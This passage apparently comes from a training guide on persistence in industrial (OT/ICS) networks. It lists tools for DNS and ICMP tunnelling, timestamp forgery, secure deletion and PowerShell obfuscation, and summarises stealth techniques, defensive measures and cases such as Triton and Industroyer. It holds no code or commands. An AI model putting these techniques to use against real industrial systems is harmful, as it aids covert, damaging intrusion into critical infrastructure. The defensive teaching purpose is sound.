Firmware Mod Kit: Firmware manipulation

Covert Channels
●​ iodine: DNS tunneling
●​ ptunnel: ICMP tunneling
●​ Modbus-Spy: Modbus protocol analyzer

Anti-Forensics
●​ Timestomp: Modify file timestamps
●​ SDelete: Secure file deletion
●​ Invoke-Obfuscation: PowerShell obfuscation

Summary

Advanced persistence in OT networks leverages unique characteristics of industrial
environments:
Key Techniques:
●​
●​
●​
●​
●​

Firmware-based persistence (PLCs, switches, routers)
Living off the land (abuse legitimate ICS tools)
Covert channels (protocol tunneling, steganography, timing)
Multi-layered redundancy (mutual reinfection)
Anti-forensics (timestomping, log clearing, self-deletion)

Challenges:
●​ Air-gapped environments require pre-positioned access
●​ Long-term operations demand extreme stealth
●​ IR evasion requires situational awareness
Defensive Strategies:
●​
●​
●​
●​
●​

Firmware integrity monitoring
Baseline process variable ranges (detect steganography)
Scheduled task auditing
Network traffic analysis (covert channel detection)
Assume compromise, hunt for persistence

Real-World Examples:
●​ Triton: Firmware-level SIS compromise
●​ Industroyer: Multi-protocol redundant backdoors
●​ APT groups: Years-long persistence in critical infrastructure

